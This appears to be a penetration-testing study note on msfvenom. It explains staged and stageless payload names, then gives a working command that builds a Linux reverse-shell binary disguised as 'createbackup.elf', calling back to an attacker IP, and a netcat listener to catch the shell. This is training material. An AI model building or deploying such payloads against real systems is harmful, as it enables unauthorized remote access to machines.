
**List msfvenom payloads**
```
msfvenom -l payloads
```

#### Staged vs Stageless Payloads: How to tell the difference

**Staged Payloads**

- Allow us to send over more components of our attacks
- Sends a "stage" to be executed on the target then calls back to the attack machine to send the remainder of the payload and execute the reverse shell
- Takes up space in memory, leaving less room for the payload


**Stageless Payloads**

- Do not have stages
- better for evasion purposes
- payloads are sent in their entirety across a network

**How to tell the difference**

The following is an example of a staged payload:*linux/x86/shell/reverse_tcp* 
- *shell* is a stage to send, as well as *reverse_tcp*. 

The following is a staged payload: windows/meterpreter/reverse_tcp

The following is an example of a stageless payload: linux/zarch/meterpreter_reverse_tcp 
- this specifies the architecture it affects, it also has the shell payload and network communications within the same function */meterpreter_reverse_tcp*

The following is a stageless payload: windows/meterpreter_reverse_tcp....notice how the shell payload and the network communication are in the same portion of the name

#### Building a Stageless Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
	- msfvenom, defines the tool used to make the payload
	- p, indicates that msfvenom is creating a payload
	- linux/x64/shell_reverse_tcp specifies a linux 64-bit stageless paylaod that will initiate a TCP based reverse shell
	- LHOST=10.10.14.113 LPORT=443, when executed the payload will call back to the specified IP address and port
	- f elf the `-f` flag specifies the format the generated binary will be in
	- createbackup.elf, creates the .elf binary and names the file `createbackup`


#### Make the Connection

Now on your attack box use netcat to listen for the connection
```bash
sudo nc -nlvp 443
```


